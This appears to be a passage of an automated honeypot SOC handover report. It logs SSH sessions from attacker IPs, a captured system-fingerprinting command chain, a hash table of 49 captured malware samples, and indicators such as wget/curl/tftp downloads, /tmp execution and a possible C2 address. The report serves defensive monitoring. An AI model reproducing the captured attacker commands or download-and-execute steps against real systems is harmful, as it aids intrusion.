| `2026-07-08 04:51:50` | `cowrie.command.input` |
| `2026-07-08 04:51:50` | `cowrie.command.success` |
| `2026-07-08 04:51:50` | `cowrie.command.input` |
| `2026-07-08 04:51:50` | `cowrie.command.input` |
| `2026-07-08 04:51:50` | `cowrie.command.input` |
| `2026-07-08 04:51:50` | `cowrie.command.input` |
| `2026-07-08 04:51:50` | `cowrie.log.closed` |
| `2026-07-08 04:51:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0b8b98bb195

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:53 |
| **Last Seen** | 2026-07-08 04:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:53:10` | `cowrie.session.connect` |
| `2026-07-08 04:53:11` | `cowrie.client.version` |
| `2026-07-08 04:53:11` | `cowrie.client.kex` |
| `2026-07-08 04:53:13` | `cowrie.login.success` |
| `2026-07-08 04:53:14` | `cowrie.session.params` |
| `2026-07-08 04:53:14` | `cowrie.command.input` |
| `2026-07-08 04:53:14` | `cowrie.command.input` |
| `2026-07-08 04:53:14` | `cowrie.command.input` |
| `2026-07-08 04:53:14` | `cowrie.command.input` |
| `2026-07-08 04:53:14` | `cowrie.command.input` |
| `2026-07-08 04:53:14` | `cowrie.command.success` |
| `2026-07-08 04:53:14` | `cowrie.command.input` |
| `2026-07-08 04:53:14` | `cowrie.command.input` |
| `2026-07-08 04:53:14` | `cowrie.command.input` |
| `2026-07-08 04:53:14` | `cowrie.command.input` |
| `2026-07-08 04:53:15` | `cowrie.log.closed` |
| `2026-07-08 04:53:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b17c3b50aae1

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:54 |
| **Last Seen** | 2026-07-08 04:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:54:36` | `cowrie.session.connect` |
| `2026-07-08 04:54:37` | `cowrie.client.version` |
| `2026-07-08 04:54:37` | `cowrie.client.kex` |
| `2026-07-08 04:54:39` | `cowrie.login.success` |
| `2026-07-08 04:54:41` | `cowrie.session.params` |
| `2026-07-08 04:54:41` | `cowrie.command.input` |
| `2026-07-08 04:54:41` | `cowrie.command.input` |
| `2026-07-08 04:54:41` | `cowrie.command.input` |
| `2026-07-08 04:54:41` | `cowrie.command.input` |
| `2026-07-08 04:54:41` | `cowrie.command.input` |
| `2026-07-08 04:54:41` | `cowrie.command.success` |
| `2026-07-08 04:54:41` | `cowrie.command.input` |
| `2026-07-08 04:54:41` | `cowrie.command.input` |
| `2026-07-08 04:54:41` | `cowrie.command.input` |
| `2026-07-08 04:54:41` | `cowrie.command.input` |
| `2026-07-08 04:54:41` | `cowrie.log.closed` |
| `2026-07-08 04:54:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `164.92.115[.]22` | **71** | 2026-07-08 02:55 | 2026-07-08 04:54 | 49m | 0 | `T1592` | 🟠 MEDIUM |
| `179.61.192[.]156` | **61** | 2026-07-08 02:55 | 2026-07-08 04:52 | 61m | 0 | `T1592` | 🟠 MEDIUM |
| `34.156.93[.]245` | **30** | 2026-07-08 03:02 | 2026-07-08 03:02 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `34.76.232[.]48` | **30** | 2026-07-08 04:02 | 2026-07-08 04:03 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `35.241.189[.]214` | **30** | 2026-07-08 03:26 | 2026-07-08 03:27 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-07-08 03:02 | 2026-07-08 04:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]228` | **4** | 2026-07-08 04:49 | 2026-07-08 04:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `206.81.2[.]201` | **3** | 2026-07-08 03:53 | 2026-07-08 03:54 | 1m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]133` | **3** | 2026-07-08 04:49 | 2026-07-08 04:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]208` | **3** | 2026-07-08 04:50 | 2026-07-08 04:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]222` | **3** | 2026-07-08 04:50 | 2026-07-08 04:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]150` | **2** | 2026-07-08 02:58 | 2026-07-08 03:18 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `107.150.146[.]69` | 1 | 2026-07-08 03:38 | 2026-07-08 03:38 | 38s | 0 | `T1592` | 🟢 LOW |
| `117.164.191[.]217` | 1 | 2026-07-08 03:47 | 2026-07-08 03:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.20[.]147` | 1 | 2026-07-08 04:13 | 2026-07-08 04:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | 1 | 2026-07-08 03:25 | 2026-07-08 03:26 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `183.167.217[.]86` | 1 | 2026-07-08 03:57 | 2026-07-08 03:57 | 5s | 0 | `T1592` | 🟢 LOW |
| `183.215.27[.]197` | 1 | 2026-07-08 03:00 | 2026-07-08 03:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.223.235[.]18` | 1 | 2026-07-08 04:39 | 2026-07-08 04:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `192.155.90[.]118` | 1 | 2026-07-08 04:43 | 2026-07-08 04:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `192.241.120[.]184` | 1 | 2026-07-08 03:25 | 2026-07-08 03:25 | 27s | 0 | `T1592` | 🟢 LOW |
| `2.58.172[.]185` | 1 | 2026-07-08 02:55 | 2026-07-08 02:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `212.8.242[.]38` | 1 | 2026-07-08 03:36 | 2026-07-08 03:37 | 47s | 0 | `T1592` | 🟢 LOW |
| `217.211.208[.]125` | 1 | 2026-07-08 02:59 | 2026-07-08 03:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `222.88.237[.]152` | 1 | 2026-07-08 04:19 | 2026-07-08 04:19 | 14s | 0 | `T1592` | 🟢 LOW |
| `45.198.224[.]120` | 1 | 2026-07-08 04:11 | 2026-07-08 04:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.124.153[.]33` | 1 | 2026-07-08 03:02 | 2026-07-08 03:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `5.172.6[.]79` | 1 | 2026-07-08 04:10 | 2026-07-08 04:11 | 31s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]122` | 1 | 2026-07-08 04:51 | 2026-07-08 04:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]137` | 1 | 2026-07-08 04:45 | 2026-07-08 04:45 | 2s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]222` | 1 | 2026-07-08 04:53 | 2026-07-08 04:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.21.67[.]139` | 1 | 2026-07-08 04:39 | 2026-07-08 04:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `90.230.212[.]29` | 1 | 2026-07-08 02:56 | 2026-07-08 02:58 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/73 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 67/100 | 🟡 MEDIUM | **18/73** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **32/73** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/73** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/73** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/73** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/73** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 42/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 64/100 | 🟡 MEDIUM | **12/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 84/100 | 🔴 HIGH | **35/73** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `8ee57538c54d91114aaf824330878c6bca5e905f32a7d4ee7517e1efd364e19c` | Unknown binary | `8ee57538c54d9111...` | 56/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `9b3fde5cad3037c0ed14a74c1d9b339081b7eb53dbcb2057573834a9d37a4db3` | ELF Binary (Linux executable) (x86-64 64-bit) | `9b3fde5cad3037c0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a6fbbdec757b0fe91ea18dc3d9f7b379c18ca49eeef63afaea8da3c9385b1049` | ELF Binary (Linux executable) (x86-64 64-bit) | `a6fbbdec757b0fe9...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **32/73** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `203.123.219[.]137` | KR | SK Broadband Co Ltd | **100** ⚠️ | 50 |
| `45.198.224[.]120` | NL | VPSVAULT.HOST LTD | **100** ⚠️ | 4 |
| `125.35.109[.]214` | CN | China Unicom Beijing province network | **100** ⚠️ | 50 |
| `125.20.207[.]154` | IN | Bharti Televentures Limited A/c ABTS MP | **100** ⚠️ | 50 |
| `146.56.164[.]20` | KR | Oracle Corporation , Global software solutions , California , USA | **100** ⚠️ | 2 |
| `66.132.172[.]222` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `119.207.56[.]116` | KR | Korea Telecom | **100** ⚠️ | 28 |
| `111.70.23[.]240` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 50 |
| `188.36.7[.]196` | HU | Magyar Telekom Plc. | **100** ⚠️ | 32 |
| `182.151.45[.]136` | CN | CHINANET Sichuan province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 174 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 172 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 62 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 62 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 62 |

---

## 🔕 False Positive Summary (11 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 7 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 448 cases |
| Tool 34  | Credential Extractor        | ✅ 212 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 14 fingerprints |
| Tool 36  | Command Clustering          | ✅ 9 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 99 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 11 filtered (2.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 61 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 36 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 171 priority case(s) shown individually · 33 recon entry/entries in table (12 group(s) consolidating 245 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-08T06:32:30Z_
